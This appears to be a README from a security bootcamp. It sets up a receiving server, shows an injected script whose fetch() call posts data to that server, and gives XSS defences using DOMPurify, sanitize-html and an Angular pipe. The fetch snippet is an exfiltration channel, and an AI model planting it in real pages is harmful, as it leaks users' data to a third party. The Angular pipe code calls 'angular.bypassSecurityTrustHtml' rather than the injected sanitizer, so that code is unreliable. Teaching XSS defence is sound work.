Example Server
==============

Here is an example server you can use...

The Receiving
-------------

```sh
git clone https://github.com/itenium-be/Bootcamp-Security-ExampleServer
cd Bootcamp-Security-ExampleServer
npm install
npm start
```

Endpoint: `http://_your_ip_:5000/grab-something`

### With Docker

```sh
cd Bootcamp-Security-ExampleServer
docker build -t example-server .
docker run -p 5000:5000 example-server
```


The Sending
-----------

Right now `server.js` will print anything you send as the request body.

Opening a HTML page with the following content would be interesting.

```html
<script>
fetch('http://_your_ip_:5000/grab-something', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({payload: 'something interesting here'}),
});
</script>
```

Also see `ExampleServer.postman_collection.json` to run a local test.


The Protecting
--------------

Don't allow arbitrary HTML or use something like [DOMPurify](https://github.com/cure53/DOMPurify).
or [sanitize-html](https://github.com/apostrophecms/sanitize-html)  
Modern SPA frameworks need a workaround to "enable" XSS:


```ts
const data = '<b>bold</b>';

// React:
<div dangerouslySetInnerHTML={{__html: data}} />

// Angular Html:
<div [innerHtml]="content | safeHtml">

// Angular safeHtml Pipe
const sanitizedContent = DOMPurify.sanitize(data);
return angular.bypassSecurityTrustHtml(sanitizedContent);

// Vue:
<div v-html="data" />
```


Allow user-content but be (hopefully) safe from XSS:

```ts
import { Pipe, PipeTransform } from '@angular/core';
import { DomSanitizer } from '@angular/platform-browser';
import DOMPurify from 'dompurify';

@Pipe({
  name: 'safeHtml'
})
export class SafeHtmlPipe implements PipeTransform {
  constructor(protected sanitizer: DomSanitizer) {}
  transform(value: any, type: string): any {
    const sanitizedContent = DOMPurify.sanitize(value);
    return angular.bypassSecurityTrustHtml(sanitizedContent);
  }
}
```
